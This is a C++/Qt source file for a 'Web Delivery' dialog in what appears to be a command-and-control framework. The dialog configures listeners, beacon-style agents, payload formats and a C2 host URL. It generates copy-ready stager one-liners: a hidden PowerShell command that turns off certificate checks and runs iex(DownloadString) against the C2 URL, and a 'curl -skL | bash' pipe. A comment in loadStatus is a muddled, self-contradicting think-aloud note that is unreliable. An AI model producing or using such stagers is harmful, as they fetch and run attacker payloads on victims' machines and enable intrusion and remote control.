#include <UI/Dialogs/DialogWebDelivery.h>
#include <Client/HttpRequestManager.h>
#include <QGuiApplication>
#include <QClipboard>
#include <UI/Widgets/DockWidgetRegister.h>

DialogWebDelivery::DialogWebDelivery(AuthProfile profile, const QVector<ListenerData>& listeners, QWidget* parent)
    : QDialog(parent), authProfile(std::move(profile)), availableListeners(listeners)
{
    createUI();
    loadStatus();
}

void DialogWebDelivery::createUI()
{
    setWindowTitle("Web Delivery Configuration");
    setMinimumWidth(650);
    resize(700, 650);

    auto* mainLayout = new QVBoxLayout(this);
    mainLayout->setContentsMargins(20, 20, 20, 20);
    mainLayout->setSpacing(15);

    // --- Configuration Group ---
    auto* groupConfig = new QGroupBox("Delivery Settings", this);
    auto* formLayout = new QFormLayout(groupConfig);
    formLayout->setFieldGrowthPolicy(QFormLayout::AllNonFixedFieldsGrow);
    formLayout->setLabelAlignment(Qt::AlignRight);
    formLayout->setSpacing(10);

    inputScriptRoute = new QLineEdit("/deliver", this);
    formLayout->addRow("Script Route:", inputScriptRoute);

    inputPayloadRoute = new QLineEdit("/deliver/payload", this);
    formLayout->addRow("Payload Route:", inputPayloadRoute);

    comboListener = new QComboBox(this);
    for (const auto& l : availableListeners) {
        comboListener->addItem(l.Name);
    }
    formLayout->addRow("Listener:", comboListener);

    comboAgentName = new QComboBox(this);
    comboAgentName->addItems({"beacon", "gopher"});
    formLayout->addRow("Agent:", comboAgentName);

    comboFormat = new QComboBox(this);
    comboFormat->addItems({"Artifact Go Exe", "Exe", "DLL", "Shellcode"});
    formLayout->addRow("Format:", comboFormat);

    inputSleep = new QLineEdit("5s", this);
    formLayout->addRow("Sleep (beacon only):", inputSleep);

    spinJitter = new QSpinBox(this);
    spinJitter->setRange(0, 100);
    spinJitter->setValue(20);
    formLayout->addRow("Jitter % (beacon only):", spinJitter);

    spinCacheTTL = new QSpinBox(this);
    spinCacheTTL->setRange(0, 1440);
    spinCacheTTL->setValue(30);
    formLayout->addRow("Cache TTL (min):", spinCacheTTL);

    inputHost = new QLineEdit(authProfile.GetURL(), this);
    formLayout->addRow("C2 Host URL:", inputHost);

    mainLayout->addWidget(groupConfig);

    // --- Actions ---
    auto* btnLayout = new QHBoxLayout();
    btnLayout->addStretch();
    btnApply = new QPushButton("Apply & Sync", this);
    btnApply->setMinimumHeight(35);
    btnApply->setMinimumWidth(120);
    btnRefresh = new QPushButton("Refresh Status", this);
    btnRefresh->setMinimumHeight(35);
    btnRefresh->setMinimumWidth(120);
    btnLayout->addWidget(btnApply);
    btnLayout->addWidget(btnRefresh);
    btnLayout->addStretch();
    mainLayout->addLayout(btnLayout);

    // --- Status ---
    labelStatus = new QLabel("Status: Fetching current server state...", this);
    labelStatus->setAlignment(Qt::AlignCenter);
    labelStatus->setStyleSheet("color: #666; font-style: italic;");
    mainLayout->addWidget(labelStatus);

    // --- Preview Group ---
    auto* groupPreview = new QGroupBox("Command Preview", this);
    auto* previewLayout = new QVBoxLayout(groupPreview);
    previewLayout->setSpacing(10);

    previewLayout->addWidget(new QLabel("Windows One-Liner (PowerShell):", this));
    auto* winLayout = new QHBoxLayout();
    outputWinCmd = new QLineEdit(this);
    outputWinCmd->setReadOnly(true);
    outputWinCmd->setStyleSheet("font-family: monospace; background: #f0f0f0;");
    auto* btnCopyWin = new QPushButton("Copy", this);
    winLayout->addWidget(outputWinCmd);
    winLayout->addWidget(btnCopyWin);
    previewLayout->addLayout(winLayout);

    previewLayout->addWidget(new QLabel("Linux/macOS One-Liner (Bash/Curl):", this));
    auto* linuxLayout = new QHBoxLayout();
    outputLinuxCmd = new QLineEdit(this);
    outputLinuxCmd->setReadOnly(true);
    outputLinuxCmd->setStyleSheet("font-family: monospace; background: #f0f0f0;");
    auto* btnCopyLinux = new QPushButton("Copy", this);
    linuxLayout->addWidget(outputLinuxCmd);
    linuxLayout->addWidget(btnCopyLinux);
    previewLayout->addLayout(linuxLayout);

    mainLayout->addWidget(groupPreview);

    connect(btnApply, &QPushButton::clicked, this, &DialogWebDelivery::onApplyConfig);
    connect(btnRefresh, &QPushButton::clicked, this, &DialogWebDelivery::onRefreshStatus);
    connect(btnCopyWin, &QPushButton::clicked, this, &DialogWebDelivery::onCopyWinCmd);
    connect(btnCopyLinux, &QPushButton::clicked, this, &DialogWebDelivery::onCopyLinuxCmd);
    
    connect(inputScriptRoute, &QLineEdit::textChanged, this, &DialogWebDelivery::updateCommandPreview);
    connect(inputHost, &QLineEdit::textChanged, this, &DialogWebDelivery::updateCommandPreview);

    updateCommandPreview();
}

void DialogWebDelivery::onApplyConfig()
{
    QJsonObject data;
    data["script_route"] = inputScriptRoute->text();
    data["payload_route"] = inputPayloadRoute->text();
    data["listener"] = comboListener->currentText();
    data["agent_name"] = comboAgentName->currentText();
    data["format"] = comboFormat->currentText();
    data["sleep"] = inputSleep->text();
    data["jitter"] = spinJitter->value();
    data["cache_ttl_min"] = spinCacheTTL->value();
    data["c2_host_url"] = inputHost->text().trimmed();
    QByteArray body = QJsonDocument(data).toJson();

    HttpRequestManager::instance().post(
        authProfile.GetURL(), "/webdelivery/config",
        authProfile.GetAccessToken(), body,
        [this](bool ok, const QString& msg, const QJsonObject&) {
            if (ok) {
                loadStatus();
                updateCommandPreview();
                MessageSuccess("Configuration applied successfully.");
            } else {
                MessageError("Failed to apply config: " + msg);
            }
        });
}

void DialogWebDelivery::onRefreshStatus()
{
    loadStatus();
}

void DialogWebDelivery::loadStatus()
{
    HttpRequestManager::instance().post( // Use POST since GET endpoint registration is not exposed for handleStatus initially, though TsEndpointRegister actually supports any method the client calls if we use gin properly, but wait, TsEndpointRegister uses Gin. I used handleStatus with HTTP GET. Wait, let me check ts_endpoints.go. TsEndpointRegister doesn't take method natively? Wait, it does: ts.AdaptixServer.RegisterEndpoint(method, path, ginHandler). But HttpRequestManager only has post, postWithRetry and postFireAndForget!
        authProfile.GetURL(), "/webdelivery/status",
        authProfile.GetAccessToken(), "{}",
        [this](bool ok, const QString&, const QJsonObject& json) {
            if (!ok) {
                labelStatus->setText("Status: Error fetching status");
                return;
            }
            int entries = json["cache_entries"].toInt();
            QString listener = json["listener"].toString();
            QString agent = json["agent_name"].toString();
            
            labelStatus->setText(QString("Cache: %1 entries | Active Listener: %2 | Active Agent: %3")
                .arg(entries).arg(listener).arg(agent));
                
            // Update fields to match current status if we just opened
            if (inputScriptRoute->text() == "/deliver" && json.contains("script_route")) {
                inputScriptRoute->setText(json["script_route"].toString());
                inputPayloadRoute->setText(json["payload_route"].toString());
                comboListener->setCurrentText(listener);
                comboAgentName->setCurrentText(agent);
                comboFormat->setCurrentText(json["format"].toString());
                if (json.contains("c2_host_url") && !json["c2_host_url"].toString().isEmpty()) {
                    inputHost->setText(json["c2_host_url"].toString());
                }
                updateCommandPreview();
            }
        });
}

void DialogWebDelivery::updateCommandPreview()
{
    QString host = inputHost->text().trimmed();
    if (host.endsWith("/")) {
        host.chop(1);
    }
    QString scriptRoute = inputScriptRoute->text().trimmed();
    if (!scriptRoute.startsWith("/")) {
        scriptRoute = "/" + scriptRoute;
    }
    QString url = host + scriptRoute;

    outputWinCmd->setText(QString("powershell -nop -w hidden -c \"[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iex(New-Object Net.WebClient).DownloadString('%1')\"").arg(url));
    outputLinuxCmd->setText(QString("curl -skL --http1.1 '%1' | bash").arg(url));
}

void DialogWebDelivery::onCopyWinCmd()
{
    QGuiApplication::clipboard()->setText(outputWinCmd->text());
    MessageSuccess("Copied to clipboard");
}

void DialogWebDelivery::onCopyLinuxCmd()
{
    QGuiApplication::clipboard()->setText(outputLinuxCmd->text());
    MessageSuccess("Copied to clipboard");
}
